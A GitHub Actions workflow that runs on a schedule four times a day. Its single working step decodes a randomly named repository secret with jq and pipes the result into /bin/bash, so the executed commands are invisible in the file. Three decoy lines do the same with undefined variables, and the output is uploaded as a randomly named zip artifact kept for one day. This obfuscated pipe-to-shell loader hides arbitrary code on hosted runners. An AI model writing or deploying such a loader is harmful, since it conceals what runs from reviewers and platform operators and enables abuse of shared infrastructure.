name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '5 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  action:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Begin
        env:
          x50379: ${{ secrets.x50379 }}
        run: |
          printf '%s' "$x50379" | jq -r .uqjg30469 | /bin/bash
          printf '%s' "$divr92" | jq -r .jo919 | /bin/bash
          echo $wgt232 | jq -r .pki74485 | /bin/bash
          echo $yxwt9 | jq -r .rqaa23 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: 813oHKpc
          path: "*.zip"
          retention-days: 1
